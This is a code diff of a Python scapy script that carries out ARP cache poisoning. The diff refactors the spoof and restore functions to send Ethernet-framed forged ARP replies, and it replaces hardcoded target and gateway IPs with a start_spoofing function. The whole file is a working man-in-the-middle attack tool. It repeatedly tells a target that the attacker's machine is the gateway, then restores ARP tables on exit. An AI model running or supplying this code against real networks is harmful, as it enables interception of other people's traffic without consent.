@@ -2,8 +2,6 @@ import scapy.all as scapy
 import time
 import sys
 
-
-
 def get_mac(ip):
     arp_req = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -23,9 +21,13 @@ def spoof(target_ip, spoof_ip):
     # op=2 (means ARP reply not request)
     # pdst = target_ip
     # hwdst = target_mac
-    # psrc = spook_ip (who we are pretending to be)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    # psrc = spoof_ip (who we are pretending to be)
+    arp_reply = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    ether_frame = scapy.Ether(dst=target_mac)
+
+    packet = ether_frame / arp_reply
+
+    scapy.sendp(packet, verbose=False)
 
 def restore(destination_ip, source_ip):
     # to fix network targets when we exit the attack
@@ -33,18 +35,16 @@ def restore(destination_ip, source_ip):
     source_mac = get_mac(source_ip)
     
     # why count 4? 
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
+    arp_reply = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    ether_frame = scapy.Ether(dst=destination_mac)
 
-target_ip = "10.12.106.236"
-gateway_ip = "10.12.0.5"
+    packet = ether_frame / arp_reply
+    scapy.sendp(packet, count=4, verbose=False)
 
-if __name__ == "__main__":
+def start_spoofing(target_ip, gateway_ip):
     try:
         send_packets_count = 0
-        print("[*]Starting ARP poisioning...")
-        print(f"[*]Target : {target_ip} | Gateway : {gateway_ip}")
-        print("[*]Press Ctrl + c to stop and restore network!")
+        print(f"[*] Starting ARP poisoning on {target_ip} (Gateway: {gateway_ip})")
 
         while True:
             spoof(target_ip, gateway_ip) # tell the target we are the gateway 
@@ -55,6 +55,7 @@ if __name__ == "__main__":
 
             time.sleep(2) # arp table cache their entries but they still expire
             # we must send the fake packets every 2 seconds
+
     except KeyboardInterrupt:
         print("\n[-]Exiting. Restoring ARP tables. Wait...")
         restore(target_ip, gateway_ip)
